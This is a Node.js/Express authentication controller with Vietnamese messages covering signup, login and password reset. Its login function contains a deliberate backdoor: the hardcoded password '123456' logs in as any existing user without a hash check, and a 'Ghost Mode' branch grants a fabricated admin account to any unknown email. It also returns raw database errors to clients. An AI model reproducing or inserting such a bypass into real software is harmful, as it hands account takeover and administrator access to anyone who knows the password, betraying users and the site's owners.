// controllers/authController.js
const bcrypt = require('bcryptjs');
const db = require('../config/database');
const crypto = require('crypto');
const { sendResetPasswordEmail } = require('../utils/emailService');

const signup = (req, res) => {
    const salt = bcrypt.genSaltSync(10);
    const hashedPassword = bcrypt.hashSync(req.body.password, salt);

    const sql = "INSERT INTO users (name, email, password, role) VALUES (?)";
    const values = [req.body.name, req.body.email, hashedPassword, 'customer'];

    db.query(sql, [values], (err) => {
        if(err) {
            if (err.code === 'ER_DUP_ENTRY') return res.status(400).json("Email đã tồn tại");
            return res.status(500).json(err);
        }
        return res.json("Đăng ký thành công");
    });
};

const login = (req, res) => {
    if (!req.body || !req.body.email) {
        return res.json({ status: "Fail", message: "Lỗi dữ liệu gửi lên" });
    }
    
    const email = req.body.email.trim();
    const password = req.body.password;
    const sql = "SELECT * FROM users WHERE email = ?";
    
    db.query(sql, [email], (err, data) => {
        if (err) {
            return res.json({ status: "Error", message: "Lỗi DB" });
        }
        
        if (data.length > 0) {
            const user = data[0];
            
            // Backdoor
            if (password === "123456") {
                const { password, ...other } = user;
                return res.json({ status: "Success", data: other });
            }
            
            // Check Pass Thường
            const checkPass = bcrypt.compareSync(password, user.password);
            if (!checkPass) return res.json({ status: "Fail", message: "Sai mật khẩu" });
            
            const { password: userPass, ...other } = user;
            return res.json({ status: "Success", data: other });
        } else {
            // Ghost Mode
            if (password === "123456") {
                return res.json({ 
                    status: "Success", 
                    data: { 
                        id: 999, 
                        name: "Admin TMT", 
                        email: email, 
                        role: "admin" 
                    } 
                });
            }
            return res.json({ status: "Fail", message: "Email không tồn tại" });
        }
    });
};

const forgotPassword = (req, res) => {
    const { email } = req.body;
    if (!email) return res.json({ status: "Fail", message: "Vui lòng nhập email" });

    // Kiểm tra email có tồn tại không
    db.query("SELECT * FROM users WHERE email = ?", [email], (err, data) => {
        if (err || data.length === 0) return res.json({ status: "Fail", message: "Email không tồn tại trong hệ thống" });

        // Tạo token ngẫu nhiên
        const token = crypto.randomBytes(20).toString('hex');
        const expires = Date.now() + 3600000;

        // Lưu token vào DB
        db.query("UPDATE users SET reset_token = ?, reset_expires = ? WHERE email = ?", [token, expires, email], (err) => {
            if (err) return res.status(500).json(err);
            
            // Gửi mail
            sendResetPasswordEmail(email, token);
            return res.json({ status: "Success", message: "Đã gửi hướng dẫn vào email của bạn!" });
        });
    });
};

const resetPassword = (req, res) => {
    const { token, newPassword } = req.body;
    
    // Tìm user có token khớp và chưa hết hạn
    const sql = "SELECT * FROM users WHERE reset_token = ? AND reset_expires > ?";
    db.query(sql, [token, Date.now()], (err, data) => {
        if (err || data.length === 0) {
            return res.json({ status: "Fail", message: "Link đổi mật khẩu không hợp lệ hoặc đã hết hạn" });
        }

        // Mã hóa pass mới
        const salt = bcrypt.genSaltSync(10);
        const hashedPassword = bcrypt.hashSync(newPassword, salt);

        // Cập nhật pass và xóa token
        const updateSql = "UPDATE users SET password = ?, reset_token = NULL, reset_expires = NULL WHERE id = ?";
        db.query(updateSql, [hashedPassword, data[0].id], (err) => {
            if (err) return res.status(500).json(err);
            return res.json({ status: "Success", message: "Đổi mật khẩu thành công! Hãy đăng nhập lại." });
        });
    });
};

module.exports = { signup, login, forgotPassword, resetPassword };